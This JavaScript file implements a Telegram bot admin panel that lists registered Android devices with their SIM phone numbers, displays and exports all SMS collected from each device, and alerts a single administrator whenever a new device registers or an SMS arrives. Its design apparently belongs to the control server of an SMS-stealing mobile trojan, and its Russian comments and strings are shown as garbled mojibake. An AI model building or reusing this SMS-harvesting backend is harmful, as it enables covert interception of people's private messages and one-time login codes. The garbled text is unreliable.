const { Markup } = require('telegraf');
const Device = require('../models/Device');
const SmsMessage = require('../models/SmsMessage');
const moment = require('moment');

// ID –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞ –∏–∑ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö –æ–∫—Ä—É–∂–µ–Ω–∏—è
const ADMIN_USER_ID = process.env.ADMIN_USER_ID;

// –û–±—ä–µ–∫—Ç –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è —Å–æ—Å—Ç–æ—è–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
const userStates = {};

// –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –±–æ—Ç–∞
const setupBot = (bot) => {
    // –ö–æ–º–∞–Ω–¥–∞ /start –¥–ª—è –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
    bot.start(async (ctx) => {
        const userId = ctx.from.id.toString();
        
        // –ü—Ä–æ–≤–µ—Ä—è–µ–º, —è–≤–ª—è–µ—Ç—Å—è –ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º
        if (userId === ADMIN_USER_ID) {
            await ctx.reply('–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ –ø–∞–Ω–µ–ª—å —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è! –í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:', getMainMenuKeyboard());
            userStates[userId] = { currentMenu: 'main' };
        } else {
            await ctx.reply('–ò–∑–≤–∏–Ω–∏—Ç–µ, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.');
        }
    });

    // –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–ª–±—ç–∫–æ–≤ –æ—Ç –∏–Ω–ª–∞–π–Ω-–∫–Ω–æ–ø–æ–∫
    bot.on('callback_query', async (ctx) => {
        const userId = ctx.from.id.toString();
        
        // –ü—Ä–æ–≤–µ—Ä—è–µ–º, —è–≤–ª—è–µ—Ç—Å—è –ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º
        if (userId !== ADMIN_USER_ID) {
            await ctx.answerCbQuery('–£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–π —Ñ—É–Ω–∫—Ü–∏–∏');
            return;
        }

        const data = ctx.callbackQuery.data;
        
        try {
            // –£–¥–∞–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –∫–æ–ª–±—ç–∫–µ
            await ctx.answerCbQuery();
            
            if (data === 'devices') {
                // –°–ø–∏—Å–æ–∫ —É—Å—Ç—Ä–æ–π—Å—Ç–≤
                await showDevicesList(ctx);
            } else if (data.startsWith('device:')) {
                // –î–µ—Ç–∞–ª–∏ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
                const deviceId = data.split(':')[1];
                await showDeviceDetails(ctx, deviceId);
            } else if (data.startsWith('sms:')) {
                // –°–ø–∏—Å–æ–∫ SMS –¥–ª—è —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
                const deviceId = data.split(':')[1];
                await showDeviceSms(ctx, deviceId);
            } else if (data.startsWith('export:')) {
                // –≠–∫—Å–ø–æ—Ä—Ç –≤—Å–µ—Ö SMS –¥–ª—è —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
                const deviceId = data.split(':')[1];
                await exportAllSms(ctx, deviceId);
            } else if (data === 'back_to_devices') {
                // –í–æ–∑–≤—Ä–∞—Ç –∫ —Å–ø–∏—Å–∫—É —É—Å—Ç—Ä–æ–π—Å—Ç–≤
                await showDevicesList(ctx);
            } else if (data === 'back_to_main') {
                // –í–æ–∑–≤—Ä–∞—Ç –≤ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é
                await ctx.editMessageText('–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:', getMainMenuKeyboard());
                userStates[userId] = { currentMenu: 'main' };
            } else if (data.startsWith('delete_device:')) {
                // –£–¥–∞–ª–µ–Ω–∏–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
                const deviceId = data.split(':')[1];
                await deleteDevice(ctx, deviceId);
            }
        } catch (error) {
            console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ –∫–æ–ª–±—ç–∫–∞:', error);
            await ctx.reply('–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ –æ–ø–µ—Ä–∞—Ü–∏–∏.');
        }
    });
};

// –ü–æ–ª—É—á–µ–Ω–∏–µ –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã –≥–ª–∞–≤–Ω–æ–≥–æ –º–µ–Ω—é
const getMainMenuKeyboard = () => {
    return Markup.inlineKeyboard([
        [Markup.button.callback('üì± –°–ø–∏—Å–æ–∫ —É—Å—Ç—Ä–æ–π—Å—Ç–≤', 'devices')]
    ]);
};

// –ü–æ–∫–∞–∑–∞—Ç—å —Å–ø–∏—Å–æ–∫ —É—Å—Ç—Ä–æ–π—Å—Ç–≤
const showDevicesList = async (ctx) => {
    try {
        const devices = await Device.find().sort({ lastActiveAt: -1 });
        
        if (devices.length === 0) {
            await ctx.editMessageText('–£—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω—ã.', Markup.inlineKeyboard([
                [Markup.button.callback('üè† –ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é', 'back_to_main')]
            ]));
            return;
        }
        
        let message = 'üì± *–î–æ—Å—Ç—É–ø–Ω—ã–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞:*\n\n';
        const keyboard = [];
        
        for (const device of devices) {
            const lastActive = moment(device.lastActiveAt).format('DD.MM.YYYY HH:mm');
            
            message += `*${device.deviceModel}*\n`;
            message += `üÜî ID: \`${device.deviceId}\`\n`;
            message += `üì± Android: ${device.androidVersion}\n`;
            message += `üìÖ –ê–∫—Ç–∏–≤–Ω–æ—Å—Ç—å: ${lastActive}\n`;
            message += `üì∂ SIM-–∫–∞—Ä—Ç—ã: ${device.simCards.length}\n\n`;
            
            keyboard.push([Markup.button.callback(`üì± ${device.deviceModel}`, `device:${device.deviceId}`)]);
        }
        
        keyboard.push([Markup.button.callback('üè† –ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é', 'back_to_main')]);
        
        await ctx.editMessageText(message, {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard(keyboard)
        });
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ —Å–ø–∏—Å–∫–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤:', error);
        await ctx.reply('–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ —Å–ø–∏—Å–∫–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤.');
    }
};

// –ü–æ–∫–∞–∑–∞—Ç—å –¥–µ—Ç–∞–ª–∏ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
const showDeviceDetails = async (ctx, deviceId) => {
    try {
        const device = await Device.findOne({ deviceId });
        
        if (!device) {
            await ctx.editMessageText('–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ.', Markup.inlineKeyboard([
                [Markup.button.callback('üì± –°–ø–∏—Å–æ–∫ —É—Å—Ç—Ä–æ–π—Å—Ç–≤', 'devices')]
            ]));
            return;
        }
        
        // –ü–æ–ª—É—á–∞–µ–º –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ SMS –¥–ª—è —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
        const smsCount = await SmsMessage.countDocuments({ deviceId });
        
        let message = `üì± *–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: ${device.deviceModel}*\n\n`;
        message += `üÜî ID: \`${device.deviceId}\`\n`;
        message += `üì± Android: ${device.androidVersion}\n`;
        message += `üìÖ –ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–æ: ${moment(device.registeredAt).format('DD.MM.YYYY HH:mm')}\n`;
        message += `üìÖ –ê–∫—Ç–∏–≤–Ω–æ—Å—Ç—å: ${moment(device.lastActiveAt).format('DD.MM.YYYY HH:mm')}\n`;
        message += `‚úâÔ∏è SMS —Å–æ–æ–±—â–µ–Ω–∏–π: ${smsCount}\n\n`;
        
        if (device.simCards && device.simCards.length > 0) {
            message += `üì∂ *SIM-–∫–∞—Ä—Ç—ã:*\n`;
            for (const sim of device.simCards) {
                message += `SIM${sim.slotIndex + 1}: ${sim.phoneNumber || '–ù–æ–º–µ—Ä –Ω–µ–∏–∑–≤–µ—Å—Ç–µ–Ω'} (${sim.operatorName || '–û–ø–µ—Ä–∞—Ç–æ—Ä –Ω–µ–∏–∑–≤–µ—Å—Ç–µ–Ω'})\n`;
            }
        } else {
            message += `üì∂ *SIM-–∫–∞—Ä—Ç—ã:* –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç\n`;
        }
        
        const keyboard = [
            [Markup.button.callback('‚úâÔ∏è –ü—Ä–æ—Å–º–æ—Ç—Ä SMS', `sms:${deviceId}`)],
            [Markup.button.callback('üì• –≠–∫—Å–ø–æ—Ä—Ç –≤—Å–µ—Ö SMS', `export:${deviceId}`)],
            [Markup.button.callback('‚ùå –£–¥–∞–ª–∏—Ç—å —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ', `delete_device:${deviceId}`)],
            [Markup.button.callback('üì± –°–ø–∏—Å–æ–∫ —É—Å—Ç—Ä–æ–π—Å—Ç–≤', 'back_to_devices')],
            [Markup.button.callback('üè† –ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é', 'back_to_main')]
        ];
        
        await ctx.editMessageText(message, {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard(keyboard)
        });
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ:', error);
        await ctx.reply('–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ.');
    }
};

// –ü–æ–∫–∞–∑–∞—Ç—å SMS –¥–ª—è —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
const showDeviceSms = async (ctx, deviceId) => {
    try {
        const device = await Device.findOne({ deviceId });
        
        if (!device) {
            await ctx.editMessageText('–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ.', Markup.inlineKeyboard([
                [Markup.button.callback('üì± –°–ø–∏—Å–æ–∫ —É—Å—Ç—Ä–æ–π—Å—Ç–≤', 'devices')]
            ]));
            return;
        }
        
        // –ü–æ–ª—É—á–∞–µ–º –ø–æ—Å–ª–µ–¥–Ω–∏–µ 10 SMS –¥–ª—è —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
        const messages = await SmsMessage.find({ deviceId })
            .sort({ timestamp: -1 })
            .limit(10);
        
        let message = `‚úâÔ∏è *–ü–æ—Å–ª–µ–¥–Ω–∏–µ SMS –¥–ª—è ${device.deviceModel}:*\n\n`;
        
        if (messages.length === 0) {
            message += 'SMS —Å–æ–æ–±—â–µ–Ω–∏—è –æ—Ç—Å—É—Ç—Å—Ç–≤—É—é—Ç.';
        } else {
            for (const sms of messages) {
                message += `üì± *–û—Ç:* ${sms.sender}\n`;
                message += `üí¨ *–¢–µ–∫—Å—Ç:* ${sms.text}\n`;
                message += `üïí *–í—Ä–µ–º—è:* ${moment(sms.timestamp).format('DD.MM.YYYY HH:mm')}\n`;
                message += `üì∂ *SIM:* SIM${sms.simSlot + 1}\n\n`;
            }
        }
        
        const keyboard = [
            [Markup.button.callback('üì• –≠–∫—Å–ø–æ—Ä—Ç –≤—Å–µ—Ö SMS', `export:${deviceId}`)],
            [Markup.button.callback('üì± –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ', `device:${deviceId}`)],
            [Markup.button.callback('üì± –°–ø–∏—Å–æ–∫ —É—Å—Ç—Ä–æ–π—Å—Ç–≤', 'back_to_devices')],
            [Markup.button.callback('üè† –ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é', 'back_to_main')]
        ];
        
        await ctx.editMessageText(message, {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard(keyboard)
        });
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ SMS –¥–ª—è —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞:', error);
        await ctx.reply('–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ SMS –¥–ª—è —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞.');
    }
};

// –≠–∫—Å–ø–æ—Ä—Ç –≤—Å–µ—Ö SMS –¥–ª—è —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
const exportAllSms = async (ctx, deviceId) => {
    try {
        const device = await Device.findOne({ deviceId });
        
        if (!device) {
            await ctx.editMessageText('–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ.', Markup.inlineKeyboard([
                [Markup.button.callback('üì± –°–ø–∏—Å–æ–∫ —É—Å—Ç—Ä–æ–π—Å—Ç–≤', 'devices')]
            ]));
            return;
        }
        
        // –ü–æ–ª—É—á–∞–µ–º –≤—Å–µ SMS –¥–ª—è —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
        const messages = await SmsMessage.find({ deviceId }).sort({ timestamp: -1 });
        
        if (messages.length === 0) {
            await ctx.editMessageText('SMS —Å–æ–æ–±—â–µ–Ω–∏—è –æ—Ç—Å—É—Ç—Å—Ç–≤—É—é—Ç.', Markup.inlineKeyboard([
                [Markup.button.callback('üì± –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ', `device:${deviceId}`)]
            ]));
            return;
        }
        
        // –§–æ—Ä–º–∏—Ä—É–µ–º —Ç–µ–∫—Å—Ç –¥–ª—è —ç–∫—Å–ø–æ—Ä—Ç–∞
        let exportText = `üì± *–≠–∫—Å–ø–æ—Ä—Ç SMS –¥–ª—è ${device.deviceModel}*\n`;
        exportText += `üìÖ *–î–∞—Ç–∞ —ç–∫—Å–ø–æ—Ä—Ç–∞:* ${moment().format('DD.MM.YYYY HH:mm')}\n`;
        exportText += `üì± *–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ:* ${device.deviceModel} (${device.androidVersion})\n`;
        exportText += `‚úâÔ∏è *–í—Å–µ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏–π:* ${messages.length}\n\n`;
        exportText += `----------------------------------------------------------\n\n`;
        
        // –ì—Ä—É–ø–ø–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏—è –ø–æ –¥–Ω—è–º –¥–ª—è —É–¥–æ–±—Å—Ç–≤–∞ —á—Ç–µ–Ω–∏—è
        const groupedMessages = {};
        for (const message of messages) {
            const date = moment(message.timestamp).format('DD.MM.YYYY');
            if (!groupedMessages[date]) {
                groupedMessages[date] = [];
            }
            groupedMessages[date].push(message);
        }
        
        // –§–æ—Ä–º–∏—Ä—É–µ–º —Ç–µ–∫—Å—Ç —Å –≥—Ä—É–ø–ø–∏—Ä–æ–≤–∫–æ–π –ø–æ –¥–Ω—è–º
        for (const date in groupedMessages) {
            exportText += `üìÖ *${date}*\n\n`;
            
            for (const message of groupedMessages[date]) {
                exportText += `üïí ${moment(message.timestamp).format('HH:mm')}\n`;
                exportText += `üì± –û—Ç: ${message.sender}\n`;
                exportText += `üì∂ SIM${message.simSlot + 1}\n`;
                exportText += `üí¨ ${message.text}\n\n`;
            }
            
            exportText += `----------------------------------------------------------\n\n`;
        }
        
        // –ï—Å–ª–∏ —ç–∫—Å–ø–æ—Ä—Ç –æ—á–µ–Ω—å –±–æ–ª—å—à–æ–π, —Ä–∞–∑–±–∏–≤–∞–µ–º –Ω–∞ —á–∞—Å—Ç–∏
        const maxLength = 4000; // Telegram –æ–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ—Ç —Å–æ–æ–±—â–µ–Ω–∏—è –ø—Ä–∏–º–µ—Ä–Ω–æ –¥–æ 4096 —Å–∏–º–≤–æ–ª–æ–≤
        if (exportText.length > maxLength) {
            let parts = [];
            for (let i = 0; i < exportText.length; i += maxLength) {
                parts.push(exportText.substring(i, i + maxLength));
            }
            
            for (let i = 0; i < parts.length; i++) {
                await ctx.reply(`–ß–∞—Å—Ç—å ${i + 1}/${parts.length}\n\n${parts[i]}`, {
                    parse_mode: 'Markdown'
                });
            }
            
            await ctx.reply('–≠–∫—Å–ø–æ—Ä—Ç –∑–∞–≤–µ—Ä—à–µ–Ω', Markup.inlineKeyboard([
                [Markup.button.callback('üì± –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ', `device:${deviceId}`)],
                [Markup.button.callback('üì± –°–ø–∏—Å–æ–∫ —É—Å—Ç—Ä–æ–π—Å—Ç–≤', 'back_to_devices')],
                [Markup.button.callback('üè† –ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é', 'back_to_main')]
            ]));
        } else {
            await ctx.reply(exportText, {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('üì± –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ', `device:${deviceId}`)],
                    [Markup.button.callback('üì± –°–ø–∏—Å–æ–∫ —É—Å—Ç—Ä–æ–π—Å—Ç–≤', 'back_to_devices')],
                    [Markup.button.callback('üè† –ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é', 'back_to_main')]
                ])
            });
        }
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ —ç–∫—Å–ø–æ—Ä—Ç–µ SMS:', error);
        await ctx.reply('–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ —ç–∫—Å–ø–æ—Ä—Ç–µ SMS.');
    }
};

// –£–¥–∞–ª–µ–Ω–∏–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
const deleteDevice = async (ctx, deviceId) => {
    try {
        // –£–¥–∞–ª—è–µ–º —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ –∏ –≤—Å–µ –µ–≥–æ SMS
        await Device.deleteOne({ deviceId });
        await SmsMessage.deleteMany({ deviceId });
        
        await ctx.editMessageText('‚úÖ –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ –∏ –≤—Å–µ –µ–≥–æ SMS —É—Å–ø–µ—à–Ω–æ —É–¥–∞–ª–µ–Ω—ã.', Markup.inlineKeyboard([
            [Markup.button.callback('üì± –°–ø–∏—Å–æ–∫ —É—Å—Ç—Ä–æ–π—Å—Ç–≤', 'back_to_devices')],
            [Markup.button.callback('üè† –ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é', 'back_to_main')]
        ]));
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ —É–¥–∞–ª–µ–Ω–∏–∏ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞:', error);
        await ctx.reply('–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ —É–¥–∞–ª–µ–Ω–∏–∏ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞.');
    }
};

// –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –Ω–æ–≤–æ–º —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ
const notifyNewDevice = async (device) => {
    try {
        if (!global.bot) return;
        
        let message = `üîî *–ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–æ –Ω–æ–≤–æ–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ!*\n\n`;
        message += `üì± *–ú–æ–¥–µ–ª—å:* ${device.deviceModel}\n`;
        message += `üÜî *ID:* \`${device.deviceId}\`\n`;
        message += `üì± *Android:* ${device.androidVersion}\n`;
        
        if (device.simCards && device.simCards.length > 0) {
            message += `\nüì∂ *SIM-–∫–∞—Ä—Ç—ã:*\n`;
            for (const sim of device.simCards) {
                message += `SIM${sim.slotIndex + 1}: ${sim.phoneNumber || '–ù–æ–º–µ—Ä –Ω–µ–∏–∑–≤–µ—Å—Ç–µ–Ω'} (${sim.operatorName || '–û–ø–µ—Ä–∞—Ç–æ—Ä –Ω–µ–∏–∑–≤–µ—Å—Ç–µ–Ω'})\n`;
            }
        }
        
        await global.bot.telegram.sendMessage(ADMIN_USER_ID, message, {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [Markup.button.callback('üì± –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ', `device:${device.deviceId}`)]
            ])
        });
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ –Ω–æ–≤–æ–º —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ:', error);
    }
};

// –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –Ω–æ–≤–æ–º SMS
const notifyNewSms = async (smsMessage, device) => {
    try {
        if (!global.bot) return;
        
        let message = `‚úâÔ∏è *–ù–æ–≤–æ–µ SMS —Å–æ–æ–±—â–µ–Ω–∏–µ!*\n\n`;
        message += `üì± *–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ:* ${device.deviceModel}\n`;
        message += `üÜî *ID:* \`${device.deviceId}\`\n`;
        message += `üì± *–û—Ç:* ${smsMessage.sender}\n`;
        message += `üì∂ *SIM:* SIM${smsMessage.simSlot + 1}\n`;
        message += `üïí *–í—Ä–µ–º—è:* ${moment(smsMessage.timestamp).format('DD.MM.YYYY HH:mm')}\n\n`;
        message += `üí¨ *–¢–µ–∫—Å—Ç:*\n${smsMessage.text}`;
        
        await global.bot.telegram.sendMessage(ADMIN_USER_ID, message, {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [Markup.button.callback('üì± –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ', `device:${device.deviceId}`)]
            ])
        });
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ –Ω–æ–≤–æ–º SMS:', error);
    }
};

// –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –∑–∞–≥—Ä—É–∑–∫–µ SMS
const notifyBulkSmsUpload = async (count, device) => {
    try {
        if (!global.bot) return;
        
        let message = `üì• *–ó–∞–≥—Ä—É–∂–µ–Ω—ã SMS —Å–æ–æ–±—â–µ–Ω–∏—è!*\n\n`;
        message += `üì± *–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ:* ${device.deviceModel}\n`;
        message += `üÜî *ID:* \`${device.deviceId}\`\n`;
        message += `‚úâÔ∏è *–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ:* ${count} —Å–æ–æ–±—â–µ–Ω–∏–π\n`;
        
        await global.bot.telegram.sendMessage(ADMIN_USER_ID, message, {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [Markup.button.callback('üì± –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ', `device:${device.deviceId}`)]
            ])
        });
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ –∑–∞–≥—Ä—É–∑–∫–µ SMS:', error);
    }
};

module.exports = {
    setupBot,
    notifyNewDevice,
    notifyNewSms,
    notifyBulkSmsUpload
}; 